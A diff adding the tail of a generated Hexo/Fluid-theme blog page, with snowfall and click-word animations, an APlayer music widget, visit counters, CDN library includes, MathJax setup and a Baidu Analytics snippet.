+            "opacity": startOpacity,
+            "font-size": flakeSize,
+            "top": "-25px",
+        }).animate({ //执行动画
+            "left": endLeft,
+            "opacity": endOpacity,
+            "top": documentHieght
+        }, durationTime, function() {
+            //4、当雪花落下后，删除雪花。
+            $(this).remove(); 
+        });
+    }, millisec);
+  };
+
+  function festival_is_coming(d) {
+      var dateEnd = new Date();
+      var year=dateEnd.getFullYear();
+
+      var dateBegin = new Date(year+"-"+d+" 00:00:00");
+      var dateDiff = dateEnd.getTime() - dateBegin.getTime();
+      var dayDiff = Math.abs(Math.floor(dateDiff / (24 * 3600 * 1000)));
+      return dayDiff <= 3
+  }
+
+  var oldLoad = window.onload;
+
+  var autoplay = 'true' === 'true'
+  var loop = 'true' === 'true'
+  var songs = [{"name":"さみしい夜道","artist":"三澤康広","url":"/bgm/main.mp3","cover":"/img/bgm-main.png"}]
+
+    
+    var autoplay = false;
+    var loop = false;
+  
+
+  
+
+  
+
+  
+  window.onload = function () {
+    new APlayer({
+      container: document.getElementById('aplayer'),
+      fixed: true,
+      autoplay: autoplay,
+      loop: loop,
+      order: 'random',
+      theme: '#b7daff',
+      preload: 'none',
+      audio: songs
+    });
+    oldLoad && oldLoad();
+  }
+</script>
+
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+
+    var slogan = document.getElementById('subtitle').title;
+    if (slogan == "与地球重修旧好") {
+      var typed = new Typed('#subtitle', {
+        strings: [
+          '  ',
+          "与地球重修旧好 (1/3)",
+          "与地球重修旧好 (2/3)",
+          "与地球重修旧好 (3/3)",
+          "地球已离线，重试中..."
+        ],
+        cursorChar: "丨",
+        typeSpeed: 70,
+        loop: true,
+      });
+    }
+    else {
+      var typed = new Typed('#subtitle', {
+        strings: [
+          '  ',
+          slogan+"&nbsp;"
+        ],
+        cursorChar: "丨",
+        typeSpeed: 70,
+        loop: false,
+      });
+    }
+
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+
+</script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-svg.js" ></script>
+
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript">
+      //定义获取词语下标
+      var a_idx = 0;
+      jQuery(document).ready(function ($) {
+        //点击body时触发事件
+        $("body").click(function (e) {
+          //需要显示的词语
+          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
+          //设置词语给span标签
+          var $i = $("<span/>").text(a[a_idx]);
+          //下标等于原来下标+1  余 词语总数
+          a_idx = (a_idx + 1) % a.length;
+          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
+          //获取x和y的指针坐标
+          var x = e.pageX, y = e.pageY;
+          //在鼠标的指针的位置给$i定义的span标签添加css样式
+          $i.css({
+            "z-index": 999,
+            "top": y - 20,
+            "left": x,
+            "position": "absolute",
+            "font-weight": "bold",
+            "color": rand_color()
+          });
+          // 随机颜色
+          function rand_color() {
+            return "rgb(" + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + "," + ~~(255 * Math.random()) + ")"
+          }
+          //在body添加这个标签
+          $("body").append($i);
+          //animate() 方法执行 CSS 属性集的自定义动画。
+          //该方法通过CSS样式将元素从一个状态改变为另一个状态。CSS属性值是逐渐改变的，这样就可以创建动画效果。
+          //详情请看http://www.w3school.com.cn/jquery/effect_animate.asp
+          $i.animate({
+            //将原来的位置向上移动180
+            "top": y - 180,
+            "opacity": 0
+            //1500动画的速度
+          }, 1500, function () {
+            //时间到了自动删除
+            $i.remove();
+          });
+        });
+      })
+      ;
+    </script>
+  
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
